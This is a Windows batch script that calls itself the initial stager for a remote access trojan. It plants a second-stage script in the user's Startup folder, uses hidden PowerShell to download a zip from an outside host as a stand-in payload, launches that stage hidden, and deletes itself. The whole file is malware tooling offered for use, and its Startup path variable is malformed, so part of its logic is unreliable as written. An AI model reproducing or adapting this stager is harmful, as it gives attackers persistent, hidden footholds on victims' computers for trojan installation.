@echo off
@REM initial stager for RAT
@REM created by: Sunnickel
@REM inspired by: COSMO

@REM variables
set "INITIALPATH=%cd%"
set "STARTUP=%C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup%"

@REM move into Startup Dir
cd "%STARTUP%"

@REM write payloads to startup
(
    powershell -windowstyle hidden -c "Invoke-WebRequest -Uri 'http://ipv4.download.thinkbroadband.com/10MB.zip' -Outfile 'poc.zip'"
) > stage2.cmd

@REM run payload
powershell Start-Process powershell.exe -windowstyle hidden -FilePath "stage2.cmd" -WorkingDirectory "%STARTUP%"

@REM cd change back to initial location
cd "%INITIALPATH%"
del /f initial.cmd

